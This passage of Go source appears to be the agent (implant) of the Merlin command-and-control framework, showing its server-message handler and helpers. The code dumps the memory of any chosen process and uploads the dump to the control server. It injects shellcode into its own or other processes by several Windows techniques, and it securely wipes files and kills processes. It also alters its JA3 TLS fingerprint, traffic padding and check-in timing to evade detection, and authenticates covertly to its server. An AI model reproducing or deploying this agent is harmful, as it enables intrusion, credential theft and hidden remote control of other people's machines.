		if a.Verbose {
			message("note", "Received Agent Module Directive")
		}
		p := m.Payload.(messages.Module)
		c.Job = p.Job
		switch p.Command {
		case "Minidump":
			if a.Verbose {
				message("note", "Received Minidump request")
			}

			//ensure the provided args are valid
			if len(p.Args) < 2 {
				//not enough args
				c.Stderr = "not enough arguments provided to the Minidump module to dump a process"
				break
			}
			process := p.Args[0]
			pid, err := strconv.ParseInt(p.Args[1], 0, 32)
			if err != nil {
				c.Stderr = fmt.Sprintf("minidump module could not parse PID as an integer:%s\r\n%s", p.Args[1], err.Error())
				break
			}

			tempPath := ""
			if len(p.Args) == 3 {
				tempPath = p.Args[2]
			}

			// Get minidump
			miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))

			//copied and pasted from upload func, modified appropriately
			if miniDumpErr != nil {
				c.Stderr = fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
					miniDumpErr.Error())
			} else {
				fileHash := sha256.New()
				_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
				if errW != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
					}
				}

				if a.Verbose {
					message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
						len(miniD["FileContent"].([]byte)),
						fileHash.Sum(nil)))
				}
				fileTransferMessage := messages.FileTransfer{
					FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
					FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
					IsDownload:   true,
					Job:          p.Job,
				}

				returnMessage.Type = "FileTransfer"
				returnMessage.Payload = fileTransferMessage
				return returnMessage, nil
			}
		default:
			c.Stderr = fmt.Sprintf("%s is not a valid module type", p.Command)
		}
	case "AgentControl":
		if a.Verbose {
			message("note", "Received Agent Control Message")
		}
		p := m.Payload.(messages.AgentControl)
		c.Job = p.Job
		switch p.Command {
		case "exit":
			if a.Verbose {
				message("note", "Received Agent Exit Message")
			}
			os.Exit(0)
		case "batchcommands":
			if a.Verbose {
				message("note", fmt.Sprintf("Updating BatchCommands to %s", p.Args))
			}

			b, err := strconv.ParseBool(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("Could not parse new setting: %s\r\n", err.Error())
			}
			a.BatchCommands = b
		case "sleep":
			ArgsArray := strings.Fields(p.Args)
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent sleep time to %s - %s seconds", ArgsArray[1], ArgsArray[2]))
			}

			tmin, err := strconv.ParseInt(string(ArgsArray[1]), 10, 64)
			if err != nil {
				c.Stderr = fmt.Sprintf("Could not parse WaitTimeMin as an integer:\r\n%s", err.Error())
				break
			}
			tmax, err2 := strconv.ParseInt(string(ArgsArray[2]), 10, 64)
			if err2 != nil {
				c.Stderr = fmt.Sprintf("Could not parse WaitTimeMax as an integer:\r\n%s", err2.Error())
				break
			}

			if tmin > 0 {
				a.WaitTimeMin = tmin
				a.ActiveMin = tmin
			} else {
				c.Stderr = fmt.Sprintf("The agent was provided with a WaitTimeMin that was not greater than zero:\r\n%s", strconv.FormatInt(tmin, 10))
				break
			}
			if tmax > 0 {
				a.WaitTimeMax = tmax
				a.ActiveMax = tmax
			} else {
				c.Stderr = fmt.Sprintf("The agent was provided with a WaitTimeMax that was not greater than zero:\r\n%s", strconv.FormatInt(tmax, 10))
				break
			}
		case "padding":
			t, err := strconv.Atoi(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error changing the agent message padding size:\r\n%s", err.Error())
				break
			}
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
			}
			a.PaddingMax = t
		case "inactivemultiplier":
			t, err := strconv.ParseInt(p.Args, 10, 64)
			if err != nil {
				c.Stderr = fmt.Sprintf("There was an error changing the agent inactive multiplier:\r\n%s", err.Error())
				break
			}
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent inactive multiplier to %d", t))
			}
			a.InactiveMultiplier = t
		case "inactivethreshold":
			t, err := strconv.Atoi(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("There was an error changing the agent inactive threshold:\r\n%s", err.Error())
				break
			}
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent inactive threshold to %d", t))
			}
			a.InactiveThreshold = t
		case "initialize":
			if a.Verbose {
				message("note", "Received agent re-initialize message")
			}
			a.initial = false
		case "maxretry":
			t, err := strconv.Atoi(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("There was an error changing the agent max retries:\r\n%s", err.Error())
				break
			}
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent max retries to %d", t))
			}
			a.MaxRetry = t
		case "killdate":
			d, err := strconv.Atoi(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error converting the kill date to an integer:\r\n%s", err.Error())
				break
			}
			a.KillDate = int64(d)
			if a.Verbose {
				message("info", fmt.Sprintf("Set Kill Date to: %s",
					time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
			}
		case "ja3":
			a.JA3 = strings.Trim(p.Args, "\"'")

			//Update the client
			var err error

			a.Client, err = getClient(a.Proto, "", a.JA3)

			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error setting the agent client:\r\n%s", err.Error())
				break
			}

			if a.Verbose && a.JA3 != "" {
				message("note", fmt.Sprintf("Set agent JA3 signature to:%s", a.JA3))
			} else if a.Verbose && a.JA3 == "" {
				message("note", fmt.Sprintf("Setting agent client back to default using %s protocol", a.Proto))
			}
		default:
			c.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", p.Command)
		}
		ainfo := a.getAgentInfoMessage()
		ainfo.MoreJobs = m.MoreJobs
		return ainfo, nil
	case "Shellcode":
		if a.Verbose {
			message("note", "Received shinject command")
		}

		s := m.Payload.(messages.Shellcode)
		var e error
		c.Job = s.Job
		e = a.executeShellcode(s) // Execution method determined in function

		if e != nil {
			c.Stderr = fmt.Sprintf("There was an error with the shellcode module:\r\n%s", e.Error())
		} else {
			c.Stdout = "Shellcode module executed without errors"
		}
	case "NativeCmd":
		p := m.Payload.(messages.NativeCmd)
		c.Job = p.Job
		switch p.Command {
		case "ls":
			listing, err := a.list(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
				break
			}
			c.Stdout = listing
		case "cd":
			err := os.Chdir(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
			} else {
				path, pathErr := os.Getwd()
				if pathErr != nil {
					c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
				} else {
					c.Stdout = fmt.Sprintf("Changed working directory to %s", path)
				}
			}
		case "netstat":
			c.Stdout, c.Stderr = a.netstat(p.Args)
		case "nslookup":
			var query = p.Args
			var response []string
			var err error
			if strings.ContainsAny(query, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") {
				response, err = net.LookupHost(query)
			} else {
				response, err = net.LookupAddr(query)
			}
			if err == nil && len(response) > 0 {
				c.Stdout = fmt.Sprintf("Query: %s\nResponse: %s\n", query, response)
			} else {
				if err != nil {
					c.Stderr = fmt.Sprintf("Query: %s\nError: %s\n", query, err.Error())
				} else {
					c.Stderr = fmt.Sprintf("Server can't find: %s\n", query)
				}
			}
		case "pipes":
			c.Stdout, c.Stderr = a.pipes()
		case "ps":
			c.Stdout, c.Stderr = a.ps()
		case "pwd":
			dir, err := os.Getwd()
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
			} else {
				c.Stdout = fmt.Sprintf("Current working directory: %s", dir)
			}
		case "sdelete":
			var targetFile = p.Args

			// make sure we open the file with correct permission
			// otherwise we will get the bad file descriptor error
			file, err := os.OpenFile(targetFile, os.O_RDWR, 0666)

			if err != nil {
				c.Stderr = fmt.Sprintf("Error opening file: %s\r\n%s", p.Args, err.Error())
			}

			// find out how large is the target file
			fileInfo, err := file.Stat()

			if err != nil {
				c.Stderr = fmt.Sprintf("Error determining file size: %s\r\n%s", p.Args, err.Error())
			} else {

				// calculate the new slice size
				// based on how large our target file is
				var fileSize int64 = fileInfo.Size()
				const fileChunk = 1 * (1 << 20) //1MB Chunks

				// calculate total number of parts the file will be chunked into
				totalPartsNum := uint64(math.Ceil(float64(fileSize) / float64(fileChunk)))

				lastPosition := 0

				for i := uint64(0); i < totalPartsNum; i++ {
					partSize := int(math.Min(fileChunk, float64(fileSize-int64(i*fileChunk))))
					partZeroBytes := make([]byte, partSize)

					// fill out the part with zero value
					copy(partZeroBytes[:], "0")

					// over write every byte in the chunk with 0
					n, err := file.WriteAt([]byte(partZeroBytes), int64(lastPosition))

					if err != nil {
						c.Stderr = fmt.Sprintf("Error over writing file: %s\r\n%s", p.Args, err.Error())
					}

					c.Stdout = fmt.Sprintf("Wiped %v bytes.\n", n)

					// update last written position
					lastPosition = lastPosition + partSize
				}

				file.Close()

				// finally remove/delete our file
				err = os.Remove(targetFile)
				if err != nil {
					c.Stderr = fmt.Sprintf("Error deleting file: %s\r\n%s", p.Args, err.Error())
				}
				c.Stdout = fmt.Sprintf("Securely deleted file: %s\n", p.Args)
			}
		case "ifconfig", "ipconfig":
			c.Stdout, c.Stderr = a.ifconfig()
		case "uptime":
			c.Stdout, c.Stderr = a.uptime()
		case "kill":
			pid, err := strconv.Atoi(p.Args)
			if err != nil {
				c.Stderr = fmt.Sprintf("Error parsing PID: %s\r\n%s", p.Args, err.Error())
			} else {
				proc, err := os.FindProcess(pid)
				if err != nil {
					c.Stderr = fmt.Sprintf("Could not find a process with PID %d\r\n%s", pid, err.Error())
				} else {
					err = proc.Kill()
					if err != nil {
						c.Stderr = fmt.Sprintf("Error killing process %d:\r\n%s", pid, err.Error())
					} else {
						c.Stdout = fmt.Sprintf("Succesfully killed PID %d", pid)
					}
				}
			}

		default:
			c.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", p.Command)
		}
	case "KeyExchange":
		p := m.Payload.(messages.KeyExchange)
		a.PublicKey = p.PublicKey
		return returnMessage, nil
	case "ReAuthenticate":
		if a.Verbose {
			message("note", "Re-authenticating with OPAQUE protocol")
		}

		errAuth := a.opaqueAuthenticate()
		if errAuth != nil {
			return returnMessage, fmt.Errorf("there was an error during OPAQUE Re-Authentication:\r\n%s", errAuth)
		}
		m.Type = ""
		return returnMessage, nil
	default:
		return returnMessage, fmt.Errorf("%s is not a valid message type", m.Type)
	}

	if a.Verbose && c.Stdout != "" {
		message("success", c.Stdout)
	}
	if a.Verbose && c.Stderr != "" {
		message("warn", c.Stderr)
	}

	returnMessage.Type = "CmdResults"
	returnMessage.Payload = c
	returnMessage.MoreJobs = m.MoreJobs
	if a.Debug {
		message("debug", "Leaving agent.messageHandler function without error")
	}
	return returnMessage, nil
}

func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))

	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
	}

	stdout, stderr = ExecuteCommand(j.Command, j.Args)

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
		}
	}

	return stdout, stderr
}

func (a *Agent) winExecute(j messages.WinExecute) (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for winExecute function: %s %s\n", j.Command, j.Args))
	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing windows command %s %s with ppid %d\n", j.Command, j.Args, j.Ppid))
	}

	stdout, stderr = WinExec(j.Command, j.Args, j.Ppid)

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", stdout)
		}
	}

	return stdout, stderr

}

// Functionality is split between Windows and non-windows because extra API calls need to be made
func (a *Agent) ifconfig() (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Running ifconfig function"))
	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing ifconfig function"))
	}

	stdout, stderr = Ifconfig()

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing ifconfig"))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", stdout)
		}
	}
	return stdout, stderr
}

// Functionality is split between Windows and non-windows because extra API calls need to be made
func (a *Agent) pipes() (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Running pipes function"))
	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing pipes function"))
	}

	stdout, stderr = Pipes()

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error enumerating pipes"))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", stdout)
		}
	}
	return stdout, stderr
}

// Functionality is split between Windows and non-windows because extra API calls need to be made
func (a *Agent) ps() (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Running ps function"))
	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing ps function"))
	}

	stdout, stderr = Ps()

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing ps"))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", stdout)
		}
	}
	return stdout, stderr
}

func (a *Agent) netstat(filter string) (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Running netstat function"))
	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing netstat function"))
	}

	stdout, stderr = Netstat(filter)

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing netstat"))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", stdout)
		}
	}
	return stdout, stderr
}

func (a *Agent) uptime() (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Running uptime function"))
	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing uptime function"))
	}

	stdout, stderr = Uptime()

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing uptime"))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", stdout)
		}
	}
	return stdout, stderr
}

func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {

	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for shinject function: %v", shellcode))
	}

	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(shellcode.Bytes)

	if errDecode != nil {
		if a.Verbose {
			message("warn", fmt.Sprintf("There was an error decoding the Base64 string: %s", shellcode.Bytes))
			message("warn", errDecode.Error())
		}
		return errDecode
	}

	if a.Verbose {
		message("info", fmt.Sprintf("Shellcode execution method: %s", shellcode.Method))
	}
	if a.Debug {
		message("info", fmt.Sprintf("Executing shellcode %s", shellcodeBytes))
	}

	if shellcode.Method == "self" {
		err := ExecuteShellcodeSelf(shellcodeBytes)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else if shellcode.Method == "remote" {
		err := ExecuteShellcodeRemote(shellcodeBytes, shellcode.PID)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else if shellcode.Method == "rtlcreateuserthread" {
		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, shellcode.PID)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else if shellcode.Method == "userapc" {
		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, shellcode.PID)
		if err != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		} else {
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		return err
	} else {
		if a.Verbose {
			message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", shellcode.Method))
		}
		return fmt.Errorf("Invalid shellcode execution method %s", shellcode.Method)
	}
}

func (a *Agent) list(path string) (string, error) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for list command function: %s", path))

	} else if a.Verbose {
		message("success", fmt.Sprintf("listing directory contents for: %s", path))
	}

	// Resolve relative path to absolute
	aPath, errPath := filepath.Abs(path)
	if errPath != nil {
		return "", errPath
	}
	files, err := ioutil.ReadDir(aPath)

	if err != nil {
		return "", err
	}

	details := fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)

	for _, f := range files {
		perms := f.Mode().String()
		size := strconv.FormatInt(f.Size(), 10)
		modTime := f.ModTime().String()[0:19]
		name := f.Name()
		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
	}
	return details, nil
}

//opaqueRegister is used to perform the OPAQUE Password Authenticated Key Exchange (PAKE) protocol Registration
func (a *Agent) opaqueRegister() error {

	if a.Verbose {
		message("note", "Starting OPAQUE Registration")
	}

	// Build OPAQUE User Registration Initialization
	userReg := gopaque.NewUserRegister(gopaque.CryptoDefault, a.ID.Bytes(), nil)
	userRegInit := userReg.Init(a.pwdU)

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE UserID: %x", userRegInit.UserID))
		message("debug", fmt.Sprintf("OPAQUE Alpha: %v", userRegInit.Alpha))
		message("debug", fmt.Sprintf("OPAQUE PwdU: %x", a.pwdU))
	}

	userRegInitBytes, errUserRegInitBytes := userRegInit.ToBytes()
	if errUserRegInitBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user registration initialization message to bytes:\r\n%s", errUserRegInitBytes.Error())
	}

	// Message to be sent to the server
	regInitBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "RegInit",
		Payload: userRegInitBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Set secret for JWT and JWE encryption key from PSK
	k := sha256.Sum256([]byte(a.psk))
	a.secret = k[:]

	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
	agentJWT, errJWT := a.getJWT()
	if errJWT != nil {
		return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE registration:\r\n%s", errJWT)
	}
	a.JWT = agentJWT

	regInitResp, errRegInitResp := a.sendMessage("POST", regInitBase)

	if errRegInitResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE user registration initialization message:\r\n%s", errRegInitResp.Error())
	}

	if regInitResp.Type != "RegInit" {
		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration initialization", regInitResp.Type)
	}

	var serverRegInit gopaque.ServerRegisterInit

	errServerRegInit := serverRegInit.FromBytes(gopaque.CryptoDefault, regInitResp.Payload.([]byte))
	if errServerRegInit != nil {
		return fmt.Errorf("there was an error unmarshalling the OPAQUE server register initialization message from bytes:\r\n%s", errServerRegInit.Error())
	}

	if a.Verbose {
		message("note", "Received OPAQUE server registration initialization message")
	}

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE Beta: %v", serverRegInit.Beta))
		message("debug", fmt.Sprintf("OPAQUE V: %v", serverRegInit.V))
		message("debug", fmt.Sprintf("OPAQUE PubS: %s", serverRegInit.ServerPublicKey))
	}

	// TODO extend gopaque to run RwdU through n iterations of PBKDF2
	userRegComplete := userReg.Complete(&serverRegInit)

	userRegCompleteBytes, errUserRegCompleteBytes := userRegComplete.ToBytes()
	if errUserRegCompleteBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user registration complete message to bytes:\r\n%s", errUserRegCompleteBytes.Error())
	}

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE EnvU: %x", userRegComplete.EnvU))
		message("debug", fmt.Sprintf("OPAQUE PubU: %v", userRegComplete.UserPublicKey))
	}

	// message to be sent to the server
	regCompleteBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "RegComplete",
		Payload: userRegCompleteBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	regCompleteResp, errRegCompleteResp := a.sendMessage("POST", regCompleteBase)

	if errRegCompleteResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE user registration complete message:\r\n%s", errRegCompleteResp.Error())
	}

	if regCompleteResp.Type != "RegComplete" {
		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration complete", regCompleteResp.Type)
	}

	if a.Verbose {
		message("note", "OPAQUE registration complete")
	}

	return nil
}

// opaqueAuthenticate is used to authenticate an agent leveraging the OPAQUE Password Authenticated Key Exchange (PAKE) protocol
func (a *Agent) opaqueAuthenticate() error {

	if a.Verbose {
		message("note", "Starting OPAQUE Authentication")
	}

	// 1 - Create a NewUserAuth with an embedded key exchange
	userKex := gopaque.NewKeyExchangeSigma(gopaque.CryptoDefault)
	userAuth := gopaque.NewUserAuth(gopaque.CryptoDefault, a.ID.Bytes(), userKex)

	// 2 - Call Init with the password and send the resulting UserAuthInit to the server
	userAuthInit, err := userAuth.Init(a.pwdU)
	if err != nil {
		return fmt.Errorf("there was an error creating the OPAQUE user authentication initialization message:\r\n%s", err.Error())
	}

	userAuthInitBytes, errUserAuthInitBytes := userAuthInit.ToBytes()
	if errUserAuthInitBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication initialization message to bytes:\r\n%s", errUserAuthInitBytes.Error())
	}

	// message to be sent to the server
	authInitBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "AuthInit",
		Payload: userAuthInitBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Set secret for JWT and JWE encryption key from PSK
	k := sha256.Sum256([]byte(a.psk))
	a.secret = k[:]

	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
	agentJWT, errJWT := a.getJWT()
	if errJWT != nil {
		return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE authentication:\r\n%s", errJWT)
	}
	a.JWT = agentJWT

	authInitResp, errAuthInitResp := a.sendMessage("POST", authInitBase)

	if errAuthInitResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE authentication initialization message:\r\n%s", errAuthInitResp.Error())
	}

	// When the Merlin server has restarted but doesn't know the agent
	if authInitResp.Type == "ReRegister" {
		if a.Verbose {
			message("note", "Received OPAQUE ReRegister response, setting initial to false")
		}
		a.initial = false
		return nil
	}

	if authInitResp.Type != "AuthInit" {
		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user authentication initialization", authInitResp.Type)
	}

	// 3 - Receive the server's ServerAuthComplete
	var serverComplete gopaque.ServerAuthComplete

	errServerComplete := serverComplete.FromBytes(gopaque.CryptoDefault, authInitResp.Payload.([]byte))
	if errServerComplete != nil {
		return fmt.Errorf("there was an error unmarshalling the OPAQUE server complete message from bytes:\r\n%s", errServerComplete.Error())
	}

	// 4 - Call Complete with the server's ServerAuthComplete. The resulting UserAuthFinish has user and server key
	// information. This would be the last step if we were not using an embedded key exchange. Since we are, take the
	// resulting UserAuthComplete and send it to the server.
	if a.Verbose {
		message("note", "Received OPAQUE server complete message")
	}

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE Beta: %x", serverComplete.Beta))
		message("debug", fmt.Sprintf("OPAQUE V: %x", serverComplete.V))
		message("debug", fmt.Sprintf("OPAQUE PubS: %x", serverComplete.ServerPublicKey))
		message("debug", fmt.Sprintf("OPAQUE EnvU: %x", serverComplete.EnvU))
	}

	_, userAuthComplete, errUserAuth := userAuth.Complete(&serverComplete)
	if errUserAuth != nil {
		return fmt.Errorf("there was an error completing OPAQUE authentication:\r\n%s", errUserAuth)
	}

	userAuthCompleteBytes, errUserAuthCompleteBytes := userAuthComplete.ToBytes()
	if errUserAuthCompleteBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication complete message to bytes:\r\n%s", errUserAuthCompleteBytes.Error())
	}

	authCompleteBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "AuthComplete",
		Payload: &userAuthCompleteBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Save the OPAQUE derived Diffie-Hellman secret
	a.secret = []byte(userKex.SharedSecret.String())

	// Send the User Auth Complete message
	authCompleteResp, errAuthCompleteResp := a.sendMessage("POST", authCompleteBase)

	if errAuthCompleteResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE authentication completion message:\r\n%s", errAuthCompleteResp.Error())
	}

	if authCompleteResp.Token != "" {
		a.JWT = authCompleteResp.Token
	}

	switch authCompleteResp.Type {
	case "ServerOk":
		if a.Verbose {
			message("success", "Agent authentication successful")
		}
		if a.Debug {
			message("debug", "Leaving agent.opaqueAuthenticate without error")
		}
		return nil
	default:
		return fmt.Errorf("received unexpected or unrecognized message type during OPAQUE authentication completion:\r\n%s", authCompleteResp.Type)
	}

}

// rsaKeyExchange is use to create and exchange RSA keys with the server
func (a *Agent) rsaKeyExchange() error {
	if a.Debug {
		message("debug", "Entering into rsaKeyExchange function")
	}

	pk := messages.KeyExchange{
		PublicKey: a.RSAKeys.PublicKey,
	}

	m := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "KeyExchange",
		Payload: pk,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Send KeyExchange to server
	resp, reqErr := a.sendMessage("POST", m)

	if reqErr != nil {
		return fmt.Errorf("there was an error sending the key exchange message:\r\n%s", reqErr.Error())
	}

	// Handle KeyExchange response from server
	_, errKeyExchange := a.messageHandler(resp)

	if errKeyExchange != nil {
		return fmt.Errorf("there was an error handling the RSA key exchange response message:\r\n%s", errKeyExchange)
	}

	if a.Debug {
		message("debug", "Leaving rsaKeyExchange function without error")
	}
	return nil
}

// getJWT is used to send an unauthenticated JWT on the first message to the server
func (a *Agent) getJWT() (string, error) {
	// Create encrypter
	encrypter, encErr := jose.NewEncrypter(jose.A256GCM,
		jose.Recipient{
			Algorithm: jose.DIRECT, // Doesn't create a per message key
			Key:       a.secret},
		(&jose.EncrypterOptions{}).WithType("JWT").WithContentType("JWT"))
	if encErr != nil {
		return "", fmt.Errorf("there was an error creating the JWT encryptor:\r\n%s", encErr.Error())
	}

	// Create signer
	signer, errSigner := jose.NewSigner(jose.SigningKey{
		Algorithm: jose.HS256,
		Key:       a.secret},
		(&jose.SignerOptions{}).WithType("JWT"))
	if errSigner != nil {
		return "", fmt.Errorf("there was an error creating the JWT signer:\r\n%s", errSigner.Error())
	}

	// Build JWT claims
	cl := jwt.Claims{
		Expiry:   jwt.NewNumericDate(time.Now().UTC().Add(time.Second * 10)),
		IssuedAt: jwt.NewNumericDate(time.Now().UTC()),
		ID:       a.ID.String(),
	}

	agentJWT, err := jwt.SignedAndEncrypted(signer, encrypter).Claims(cl).CompactSerialize()
	if err != nil {
		return "", fmt.Errorf("there was an error serializing the JWT:\r\n%s", err)
	}

	// Parse it to check for errors
	_, errParse := jwt.ParseSignedAndEncrypted(agentJWT)
	if errParse != nil {
		return "", fmt.Errorf("there was an error parsing the encrypted JWT:\r\n%s", errParse.Error())
	}

	return agentJWT, nil
}

// getAgentInfoMessage is used to place of the information about an agent and its configuration into a message and return it
func (a *Agent) getAgentInfoMessage() messages.Base {
	sysInfoMessage := messages.SysInfo{
		Platform:     a.Platform,
		Architecture: a.Architecture,
		UserName:     a.UserName,
		UserGUID:     a.UserGUID,
		HostName:     a.HostName,
		Pid:          a.Pid,
		Process:      a.Process,
		Ips:          a.Ips,
	}

	agentInfoMessage := messages.AgentInfo{
		Version:            merlin.Version,
		Build:              build,
		WaitTimeMin:        a.WaitTimeMin,
		WaitTimeMax:        a.WaitTimeMax,
		ActiveMin:          a.ActiveMin,
		ActiveMax:          a.ActiveMax,
		InactiveMultiplier: a.InactiveMultiplier,
		InactiveThreshold:  a.InactiveThreshold,
		PaddingMax:         a.PaddingMax,
		MaxRetry:           a.MaxRetry,
		FailedCheckin:      a.FailedCheckin,
		Proto:              a.Proto,
		SysInfo:            sysInfoMessage,
		KillDate:           a.KillDate,
		JA3:                a.JA3,
		BatchCommands:      a.BatchCommands,
	}

	baseMessage := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "AgentInfo",
		Payload: agentInfoMessage,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	return baseMessage
}

// TODO centralize this into a package because it is used here and in the server
// message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

// TODO add cert stapling
